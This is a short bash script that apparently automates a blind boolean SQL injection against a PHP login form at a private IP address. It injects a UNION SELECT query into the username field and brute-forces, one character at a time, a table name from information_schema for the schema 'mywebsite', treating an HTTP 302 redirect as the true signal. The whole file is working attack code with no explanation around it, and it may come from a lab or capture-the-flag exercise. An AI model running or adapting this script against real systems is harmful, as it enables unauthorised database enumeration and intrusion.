#!/bin/bash

IPa="10.49.148.37"
res=""
found=false

while [ "$found" = false ]; do

    for alphabet in {a..z} {A..Z} " "; do

        query="UNION+SELECT+1,2,3,4+FROM+information_schema.tables+WHERE+table_schema='mywebsite'+AND+table_name+LIKE+BINARY+'${res}${alphabet}%'+--+-&password="

        echo -ne "\rTrying: [$alphabet]\033[K"

        response=$(curl -s -o /dev/null -w "%{http_code}" \
            "http://${IPa}/index.php/" \
            -X POST \
            -d "username='+${query}")

        if [ "$response" -eq 302 ]; then
            res="${res}${alphabet}"

            echo -e "\nUpdated result: $res"

            break

        elif [ "$alphabet" = " " ]; then
            found=true
        fi

    done
done

echo -e "\n\nInjection Complete"
echo "The Final result is: $res"
